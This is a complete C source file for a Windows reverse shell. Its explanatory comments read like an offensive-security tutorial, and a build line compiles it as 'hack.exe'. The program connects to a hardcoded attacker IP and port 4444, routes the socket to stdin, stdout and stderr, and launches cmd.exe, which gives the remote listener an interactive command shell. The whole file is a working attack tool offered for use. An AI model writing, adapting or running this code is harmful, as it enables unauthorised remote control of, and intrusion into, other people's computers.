// i686-w64-mingw32-g++ .\Reverse_shells\reverse-shell-windows.c -o hack.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive






#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib, "w2_32")

WSADATA socketData; // socketData is a variable of type WSADATA, which is a structure used by the Windows Sockets API (Winsock) to store details about the Windows Sockets implementation
SOCKET mainSocket;
struct sockaddr_in connectionAddress;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInfo;

int main(int argc, char *argv[])
{
  // IP and port details for the attacker's machine
  char *attackerIP = "192.168.37.37";
  short attackerPort = 4444;

  // initialize socket library
  WSAStartup(MAKEWORD(2, 2), &socketData); // The WSAStartup function initializes the use of the Winsock DLL by a process, specifying the version of the Windows Sockets
  // specification to use and retrieving details about the implementation. It must be called before any other Winsock functions and is typically used in network programming on Windows.

  // create socket object
  mainSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  connectionAddress.sin_family = AF_INET;
  connectionAddress.sin_port = htons(attackerPort);
  connectionAddress.sin_addr.s_addr = inet_addr(attackerIP);

  // establish connection to the remote host
  WSAConnect(mainSocket, (SOCKADDR *)&connectionAddress, sizeof(connectionAddress), NULL, NULL, NULL, NULL);

  memset(&startupInfo, 0, sizeof(startupInfo));
  startupInfo.cb = sizeof(startupInfo);
  startupInfo.dwFlags = STARTF_USESTDHANDLES; // Tells Windows: “Use the custom handles I provide for stdin, stdout, stderr.”
  startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE)mainSocket;
  // Redirects the new process’s input, output, and error streams all to the same handle.
  // Here, you’re assigning the socket handle (mainSocket) as stdin/stdout/stderr. it is same as dup2 in linux

  CreateProcess(
      NULL,         // Application name (NULL = use command line instead)
      "cmd.exe",    // Command line to run
      NULL,         // Process security attributes
      NULL,         // Thread security attributes
      TRUE,         // Inherit handles (⚠️ must be TRUE so the socket gets inherited) If this were FALSE, the child would ignore your redirected stdin/stdout/stderr. 
      0,            // 0 means default (normal priority, visible window if GUI app).
      NULL,         // Environment (NULL = inherit from parent)
      NULL,         // Current directory (NULL = inherit)
      &startupInfo, // Startup info (with redirected stdin/out/err)
      &processInfo  // Receives process/thread handles
  );

  exit(0);
}